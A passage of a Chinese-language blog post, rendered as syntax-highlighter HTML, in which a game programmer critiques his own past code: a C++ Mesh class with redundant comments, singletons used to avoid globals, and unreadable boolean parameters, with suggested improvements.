class=\"crayon-h\">\t</span><span class=\"crayon-t\">bool</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">IsTranslucent</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// Returns true if this mesh needs access to the back buffer</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c14f4594784944-21\"><span class=\"crayon-h\">\t</span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AddCell</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Cell</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cell</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// Adds a cell to the list of cells this mesh is inside</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14f4594784944-22\"><span class=\"crayon-h\">\t</span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ClearCells</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// Clears the list of cells this mesh is inside</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c14f4594784944-23\"><span class=\"crayon-m\">protected</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14f4594784944-24\"><span class=\"crayon-h\">\t</span><span class=\"crayon-v\">ID3DXMesh</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">d3dmesh</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// Actual mesh data</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c14f4594784944-25\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e\">LPCSTR </span><span class=\"crayon-v\">filename</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// Mesh file name; used for caching</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14f4594784944-26\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e\">DWORD </span><span class=\"crayon-v\">numSubsets</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// Number of subsets (materials) in the mesh</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c14f4594784944-27\"><span class=\"crayon-h\">\t</span><span class=\"crayon-v\">std</span><span class=\"crayon-o\">::</span><span class=\"crayon-e\">vector </span><span class=\"crayon-v\">materials</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// List of materials; loaded from X file</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14f4594784944-28\"><span class=\"crayon-h\">\t</span><span class=\"crayon-v\">std</span><span class=\"crayon-o\">::</span><span class=\"crayon-v\">vector</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">Cell</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cells</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// List of cells this mesh is inside</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c14f4594784944-29\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e\">D3DXVECTOR3 </span><span class=\"crayon-v\">center</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// The center of the mesh</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14f4594784944-30\"><span class=\"crayon-h\">\t</span><span class=\"crayon-t\">float</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">radius</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// The distance from the center to the outermost vertex of the mesh</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c14f4594784944-31\"><span class=\"crayon-h\">\t</span><span class=\"crayon-t\">bool</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">alpha</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// True if this mesh has alpha information</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14f4594784944-32\"><span class=\"crayon-h\">\t</span><span class=\"crayon-t\">bool</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">translucent</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// True if this mesh needs access to the back buffer</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c14f4594784944-33\"><span class=\"crayon-h\">\t</span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">SetTo</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Mesh</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mesh</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14f4594784944-34\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0063 seconds] -->\r\n<p>我还了解到，注释也被看作为好代码的标志，这导致我写出这样的「瑰宝」：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bab39c14f8396617292\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">C++</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nD3DXVECTOR3 GetCenter(); // Gets the center of the mesh</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bab39c14f8396617292-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bab39c14f8396617292-1\"><span class=\"crayon-e\">D3DXVECTOR3 </span><span class=\"crayon-e\">GetCenter</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// Gets the center of the mesh</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这个类还存在更严重的问题。Mesh 的概念是一个令人困惑的抽象，在现实世界没有参照物。尽管是我写出来的，但我也对它感到困惑。这是一个容纳顶点、索引和其他数据的容器吗？这是一个用于从磁盘加载和卸载数据的资源管理器吗？这是一个将数据发送到 GPU 的渲染器吗？它代表了所有这些东西。</p>\n<h3>如何改进</h3>\n<p>Mesh 类应该是一个「普通的旧数据结构」。它应该没有「智能」，这意味着我们可以安全地将所有无用的 getters 和 setters 丢弃，并将所有的字段都设为 public 属性。</p>\n<p>然后，我们可以将资源管理和渲染分离为独立于惰性数据的系统。是的，是系统，而不是对象。当另一种抽象更合适时，就没必要将每个问题都转化为面向对象的抽象。</p>\n<p>关于注释问题的修改，大多数时候，删除就可以了。由于注释不受编译器检查，容易过时，这是造成误导的主要因素。我认为不应该对代码进行注释，除非他们属于以下情况：</p>\n<ul>\n<li>注释解释的是 <strong>why</strong>，而不是 <strong>what</strong>。这些注释是最有用的。</li>\n<li>用几句话来解释下面的大块代码是什么。这些注释有助于指导和阅读代码。</li>\n<li>对声明的数据结构进行注释，说明每个字段的意义。这些注释往往是不必要的。但有时，字段与内存中的概念的映射关系不能够直观显示，就有必要通过添加注释来描述这种映射关系。</li>\n</ul>\n<h2>2007-2008 年</h2>\n<p>这段时间，是我的「PHP 黑暗岁月」。<br>\n<img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1fgcfxhk5f2j20hp09v75y.jpg\" width=\"637\" height=\"355\"></p>\n<h2>2009-2010 年</h2>\n<p>此时，我正在上大学。我做了一个基于 Python 的第三人称多人射击游戏《 Acquire、Attack、 Asplode、 Pwn》（简称 A3P）。关于此项目，我没有任何理由为自己辩解。<del>形势真的越来越尴尬了，这个项目带了一个侵犯健康权益的背景音乐。</del></p>\n<p>（伯小乐注：这个视频搬运失败，请看这里：<a href=\"https://youtu.be/qdt2ixQSjZo\" target=\"_blank\">https://youtu.be/qdt2ixQSjZo</a> ）</p>\n<p>当我写这个游戏的时候，新学到的经验是全局变量被认为是糟糕代码的标志。全局变量提高了代码的耦合度。它们允许 A 函数通过修改全局变量进入完全不相关的 B 函数。 全局变量无法跨线程使用。</p>\n<p>然而，几乎所有的游戏代码都需要访问整个 world 状态。我通过将所有内容存储在「world」对象中，并将「world」传递到每个单独的函数中来「解决」这个问题。 再也没有全局变量了！我认为这是「出色的实现」，因为理论上我可以同时运行多个、独立的「world」。</p>\n<p>在实践中，「world」作为一个事实上的全局状态容器。多个「worlds」的想法当然是不需要的，也没有经过测试，但我相信，如果没有进行重大的重构，这也不会有效。</p>\n<p>一旦你加入了清理全局变量的奇特「宗教团体」，你会找到很多有创意方法用以欺骗自己。最糟糕的莫过于单例：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bab39c14fe514389756\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nclass Thing\r\n{\r\n    static Thing i = null;\r\n    public static Thing Instance()\r\n    {\r\n        if (i == null)\r\n            i = new Thing();\r\n        return i;\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bab39c14fe514389756-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14fe514389756-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c14fe514389756-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14fe514389756-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c14fe514389756-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14fe514389756-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c14fe514389756-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14fe514389756-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c14fe514389756-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14fe514389756-10\">10</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bab39c14fe514389756-1\"><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Thing</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14fe514389756-2\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c14fe514389756-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Thing</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14fe514389756-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Thing </span><span class=\"crayon-e\">Instance</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c14fe514389756-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14fe514389756-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c14fe514389756-7\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Thing</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14fe514389756-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c14fe514389756-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14fe514389756-10\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p>哇，魔术啊！ 看不到一个全局变量！然而，单例比全局变量更糟糕，原因如下：</p>\n<ul>\n<li>全局变量的所有潜在缺陷仍存在于单例中。 如果你认为单例不是一个全局变量，你只不过是在自欺欺人罢了。</li>\n<li>在最好的情况下，访问单例只是给你的程序增加了昂贵的分支指令。 在最坏的情况下，这将会是一个完整的函数调用。</li>\n<li>你不知道一个单例会在什么时候被初始化，直到该程序被真正地运行。这是程序员简单地将本该在设计时应该做出的决策留给程序自己去处理的另一个例子。</li>\n</ul>\n<h3>如何改进</h3>\n<p>如果某个变量必须要全局化，就让它全局化好了。在定义全局变量时，请结合整个项目进行考虑。有些经验可以借鉴。</p>\n<p>真正的问题在于代码之间相互依赖。全局变量，容易使不相关的代码之间创建不可见的依赖关系。组合相互依赖的代码，并入到内聚的系统中，以最小化这些不可见的依赖关系。实现它的一个好方法，就是将与系统相关的所有内容都放到该系统自己的线程中，并强制其它的代码通过消息传递与该系统通信。</p>\n<h3>布尔参数</h3>\n<p>你可能写过像这样的代码：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bab39c1502592310740\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">Python</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nclass ObjectEntity:\r\n    def delete(self, killed, local):\r\n        # ...\r\n        if killed:\r\n            # ...\r\n        if local:\r\n            # ...</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bab39c1502592310740-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c1502592310740-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c1502592310740-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c1502592310740-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c1502592310740-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c1502592310740-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c1502592310740-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bab39c1502592310740-1\"><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ObjectEntity</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c1502592310740-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-r\">def</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">delete</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">killed</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">local</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c1502592310740-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\"># ...</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c1502592310740-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">killed</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c1502592310740-5\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\"># ...</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c1502592310740-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">local</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c1502592310740-7\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\"># ...</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n<p>在这里，我们有四个不同的但又极度相似的「删除」操作，它们的差异仅仅在于两个布尔参数。看起来似乎完全合理。现在，让我们来看看调用这个函数的客户端代码：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bab39c1505207997694\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">Python</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nobj.delete(True, False)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bab39c1505207997694-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bab39c1505207997694-1\"><span class=\"crayon-v\">obj</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">delete</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">True</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">False</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>可读性很差，不是吗？</p>\n<h3>如何改进</h3>\n<p>这是个案。然而，<a href=\"https://mollyrocket.com/casey/index.html\">Casey Muratori</a> 提供的一条建议适用于此：<strong>先写客户端代码</strong>。我敢肯定，任何一个有理智的人，都不会写出上面这种客户端代码。 相反地，你可能会这样写：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bab39c1509142849462\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">Python</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nobj.killLocal()</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bab39c1509142849462-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bab39c1509142849462-1\"><span class=\"crayon-v\">obj</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">killLocal</span><span class=\"crayon-sy\">(</span><span 